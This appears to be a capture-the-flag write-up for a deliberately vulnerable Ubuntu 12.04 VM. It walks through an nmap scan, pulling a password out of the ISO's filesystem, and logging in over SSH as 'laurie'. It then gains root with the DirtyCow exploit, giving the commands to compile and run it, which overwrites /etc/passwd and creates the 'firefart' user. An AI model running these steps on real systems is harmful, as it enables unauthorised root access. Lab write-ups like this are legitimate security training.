# Writeup 2

First we need to find the IP address of Virtual machine.

For that we use `nmap` package to process the next search:

``` bash
$ nmap 192.168.56.1-255
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 17:56 MSK
Nmap scan report for 192.168.56.102  <== THIS is the IP address we are looking for
Host is up (0.015s latency).
Not shown: 987 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp
143/tcp open  imap
443/tcp open  https
465/tcp open  smtps
563/tcp open  snews
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 255 IP addresses (1 host up) scanned in 37.77 seconds
```
Next step we browse the ISO file System.

Among other files ISO contains this `/casper/filesystem.squashfs` which is actually a whole compressed file system.
In order to decompress it we run the command:

``` bash
$ unsquashfs <destination_path> <your_path_to_ISO/casper/filesystem.squashfs>
```

After extracting the file system we see these two files in `/home/lmezard/`:

``` bash
$ ls /home/lmezard
fun  README
```

fun is an archive, unarchive then:

``` bash
$ tar xvf fun ; ls
ft_fun  fun  README
```

ft_fun directory conrtains many many files, written in C with comments containing its serial number.

For combining them together we use our `script.py` and creating new file `script.c`

``` bash
$ gcc script.c 
$ ./a.out 
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```
``` bash
$ echo -n Iheartpwnage | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

Now we are ready to connect via SSH and use the hash above as a password to `laurie` user.

``` bash
$ ssh laurie@192.168.56.102
Password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

For the next step we need to use system vulnerabilities.
The Linux kernel we are work with is:

``` bash
$ uname -r
3.2.0-91-generic-pae
```

``` bash
$ cat /etc/*-release
Ubuntu, 12.04
```

In order to exploit the system we search this [website](www.exploit-db.com) and find the [next solution](https://www.exploit-db.com/exploits/40839)

This exploit uses the dirtycow vulnerability, which is a computer security vulnerability for the Linux kernel that affected all Linux-based operating systems, including Android devices, that used older versions of the Linux kernel created before 2018. It is a local privilege escalation bug that exploits a race condition in the implementation of the copy-on-write mechanism in the kernel's memory-management subsystem. Computers and devices that still use the older kernels remain vulnerable.



After compiling and running the program the user will be prompted for the new password.

Then this exploit back up the /etc/passwd file to /tmp/passwd.bak and overwrites the root account with the generated line.

After running the exploit you should be able to login with the newly created user, whiср name is "firefart" by default, and use this exploit to modify the user values according to your needs.

Compile the file
``` bash
$ gcc -pthread dirty.c -o dirty -lcrypt
```
Run the script with your new password
``` bash
$ ./dirty <my-new-password>
```
Log in to the root user named firefart
``` bash
$ su firefart
```

Enter your new password password
